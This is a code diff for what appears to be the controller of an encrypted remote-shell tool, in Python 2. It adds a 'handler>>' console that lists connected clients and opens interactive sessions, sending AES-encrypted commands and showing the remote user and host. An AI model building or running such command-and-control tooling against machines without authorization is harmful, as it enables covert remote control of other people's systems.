@@ -25,7 +25,13 @@ class Client:
 		return self.aes_obj.decrypt(base64.b64decode(data))
 		
 	def send(self, data):
-		self.sock.sendall(self.encrypt(command))
+		self.sock.sendall(self.encrypt(data))
+		
+	def recv(self):
+		data = self.sock.recv(4096)		
+		if not data: raise Exception("[-] Client Disconnected")
+				
+		return self.decrypt(data)
 		
 	def make_prompt(self, data_package):
 		if data_package["username"] and data_package["hostname"]:
@@ -51,10 +57,8 @@ class Client:
 			else:
 				try:
 					self.send(user_input)
-					data = self.socket.recv(4096)		
-					if not data: raise Exception("[-] Client Disconnected")
-				
-					data = self.decrypt(data)
+					
+					data = self.recv()
 				
 					data_package = json.loads(data)
 					for key in data_package:
@@ -66,8 +70,7 @@ class Client:
 				
 				except Exception as e:
 						print "Something went wrong" 
-						print "[-] Broken pipe..."
-						print "[*] Attempting reconnection"
+						print e
 						break
 		
 
@@ -120,11 +123,9 @@ class Handler:
 		
 	def accept_clients(self):
 		while True:
-			print "listening"
 			client, addr = self.server_sock.accept()
-			print "got client"
 			key, IV = self.gen_diffie_key(client)
-			print key, IV
+
 			c = Client(len(self.clients), client, addr[0], addr[1], key, IV)
 			self.clients.append(c)
 			
@@ -134,8 +135,17 @@ class Handler:
 		t.daemon = True
 		t.start()
 		while True:
-			time.sleep(5)
-			print self.clients
+			user_input = raw_input("handler>> ")
+			if user_input == "list":
+				for c in self.clients:
+					print "["+str(c.id)+"]: " + c.address + ":" + str(c.port)
+					
+			elif user_input.startswith("interact"):
+				try:
+					req_id = int(user_input.split()[1])
+					self.clients[req_id].interact()
+				except Exception as e:
+					print e
 
 
 	# def interface(self):
